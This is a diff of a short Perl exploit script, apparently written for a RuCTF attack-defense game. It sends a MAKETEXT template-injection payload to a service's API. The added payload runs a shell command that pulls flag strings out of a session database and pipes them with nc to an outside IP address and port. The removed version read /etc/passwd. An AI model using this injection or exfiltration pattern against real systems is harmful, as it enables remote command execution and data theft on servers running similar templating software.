@@ -8,7 +8,9 @@ sub DEBUG{1};
 
 my $endpoint = shift or print_usage();
 my $session  = shift or print_usage();
-my $params = { id => q!%MAKETEXT{"test [_1] secondtest\\'}; `cat /etc/passwd > /tmp/xxx`; { #" args="tmp"}%! };
+my $params = { 
+    id => q!%MAKETEXT{"test [_1] secondtest\\'}; `strings db/ses.sqlite | grep ructf | nc 172.16.16.100 31338`; { #" args="tmp"}%!
+};
 
 if (DEBUG) {
     print  "#------------------> REQUEST ----------------------------\n";
@@ -18,7 +20,7 @@ if (DEBUG) {
     print  "#------------------< REPLY ------------------------------\n";
 }
 
-my $api = new Ses::SesAPI($endpoint,"session=$session");
+my $api = new Ses::SesAPI("http://$endpoint:8888","session=$session");
 my ($ok,$data,$status) = $api->sendRequest("error",$params);
 
 printf "# Status: %s\n", $status;
